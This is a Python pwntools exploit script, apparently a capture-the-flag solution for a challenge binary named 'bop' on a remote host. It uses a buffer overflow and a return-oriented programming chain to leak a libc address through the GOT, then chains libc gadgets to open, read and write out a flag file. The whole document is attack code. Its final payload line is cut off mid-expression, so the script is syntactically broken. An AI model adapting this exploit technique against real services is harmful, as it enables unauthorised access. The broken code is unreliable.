#!/usr/bin/env python3



from pwn import *


e = ELF("./bop_patched")
libc = ELF("./libc.so.6")
r = remote("mc.ax",30284)
exploit = b"A" * 40  + p64(0x4013d4) + p64(0x4013d3) + p64(e.got.printf) + p64(e.plt.printf) + p64(0x4013d4) + p64(0x4012f9) 
r.recvuntil(b"Do you bop? ")
r.sendline(exploit)
libc_leak = u64(r.recvuntil('\x7f').decode('latin-1').ljust(8,'\x00'))
libc_base = libc_leak - libc.sym.printf
log.info("The libc base of the process is " + hex(libc_base))
exploit = b"A" * 40 + p64(0x4013d3) + p64(0x4040b0) + p64(e.sym.gets)  + p64(libc_base + 0x142c92)  + p64(0) + p64(0x4013d3) + p64(0x4040b0) + p64(libc_base + 0x2601f) + p64(0) + p64(libc_base + 0x36174) + p64(2) + p64(libc_base + 0x630a9) + p64(0x4013d3) + p64(3)  + p64(libc_base + 0x2601f) + p64(0x4040d0) + p64(libc_base + 0x142c92) + p64(80) + p64(libc_base + 0x36174) + p64(0) + p64(libc_base + 0x630a9) + p64(libc_base + 0x36174) + p64(1) + p64(0x4013d3) + p64(1) + p64(libc_base + 0x2601f) + p64(0x4040d0) + p64(libc_base + 0x630a9 
r.sendline(exploit)
r.sendline(b"./flag.txt\x00")
r.interactive()
